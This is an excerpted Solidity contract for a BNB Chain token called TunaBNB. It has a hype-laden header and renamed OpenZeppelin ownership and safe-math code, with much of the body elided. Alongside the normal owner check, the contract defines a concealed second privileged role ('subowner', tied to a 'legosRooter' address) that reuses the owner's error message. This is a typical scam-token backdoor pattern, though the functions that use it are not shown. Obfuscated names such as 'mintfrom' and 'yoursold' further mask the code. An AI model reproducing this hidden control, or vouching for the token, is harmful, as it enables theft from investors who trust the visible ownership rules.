...
/*
TunaBNB 
Welcome to TunaBNB (TUNA), our mission to make BSC great again. 
We are here to turn BNB around and point it in the right direction. 
Now get me the tuna...put those claws 🐾 on the TUNABNB while you still can. 
for updates , active team members and passion for Tuna 🐟
...
/*
 * @dev Provides information about the current execution TunaBNB20Burnable, including the
 ...
 */
abstract contract TunaBNB20Burnable {
...
// File: @openzeppelin/contracts/access/TunaBNB20Ownable.sol
 ...
 * the owner.
 */
abstract contract TunaBNB20Ownable is TunaBNB20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "TunaBNB20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "TunaBNB20Ownable: new owner is the zero address");
 ...
 * `SafeTunaBNB` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeTunaBNB {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeTunaBNB: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeTunaBNB: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeTunaBNB: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeTunaBNB: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeTunaBNB: modulo by zero");
  }
...
contract TunaBNBToken is TunaBNB20Burnable, TunaBNB33, TunaBNB20Ownable {
    
    using SafeTunaBNB for uint256;
   ...
   address private marketingAddress = 0xf89d7b9c864f589bbF53a82105107622B35EaA40;
    string public TunaBNBouratelegramz = "https://t.me/TunaBNBToken";
            function getTunaBNBouratelegramz() public view returns (string memory) {
        return TunaBNBouratelegramz;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {TunaBNB33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "TunaBNB20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {TunaBNB33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {TunaBNB33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {TunaBNB33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "TunaBNB33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {TunaBNB33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "TunaBNB33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "TunaBNB33: transfer from the zero address");
        require(shippingto != address(0), "TunaBNB33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "TunaBNB33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "TunaBNB33: approve from the zero address");
        require(transporteur != address(0), "TunaBNB33: approve to the zero address");
